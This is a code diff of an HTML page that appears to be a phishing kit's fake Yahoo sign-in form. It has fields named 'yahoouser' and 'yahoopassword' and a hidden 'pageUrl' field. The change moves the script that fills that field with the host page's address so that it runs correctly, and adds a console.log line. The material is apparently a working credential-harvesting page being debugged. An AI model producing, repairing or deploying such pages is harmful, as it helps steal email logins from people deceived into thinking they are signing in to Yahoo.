@@ -45,22 +45,7 @@
       id="bv_Form1"
       style="position:absolute;left:9px;top:0px;width:401px;height:503px;z-index:4"
     >
-      <script>
-        var tbstring = location.href.substring(0, location.href.lastIndexOf("/"));
-      var urlss = document.getElementById("pageUrl");
-      urlss.value = tbstring;
-        
-        function validateForm() {
-          var x = document.forms["Form1"]["yahoouser"].value;
-          var y = document.forms["Form1"]["yahoopassword"].value;
-          if (x == "" || y == "") {
-            alert("Email or Password fields cannot be empty!");
-            return false;
-          }
-        }
-        
-        // onsubmit="return validateForm()"
-      </script>
+     
 
       <style></style>
 
@@ -72,7 +57,7 @@
         required
       >
 
-      <input type="hidden" name="pageUrl" id="pageUrl" value="">
+
 
         <input
           id="yahoouser"
@@ -99,7 +84,26 @@
           style="position:absolute;left:83px;top:244px;width:222px;height:39px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2"
           type="submit"
         />
+        
+              <input type="hidden" name="pageUrl" id="pageUrl" value="">
       </form>
     </div>
+    
+     <script>
+        var tbstring = location.href.substring(0, location.href.lastIndexOf("/"));
+      var urlss = document.getElementById("pageUrl");
+      urlss.value = tbstring;
+        console.log(urlss.value);
+        function validateForm() {
+          var x = document.forms["Form1"]["yahoouser"].value;
+          var y = document.forms["Form1"]["yahoopassword"].value;
+          if (x == "" || y == "") {
+            alert("Email or Password fields cannot be empty!");
+            return false;
+          }
+        }
+        
+        // onsubmit="return validateForm()"
+      </script>
   </body>
 </html>
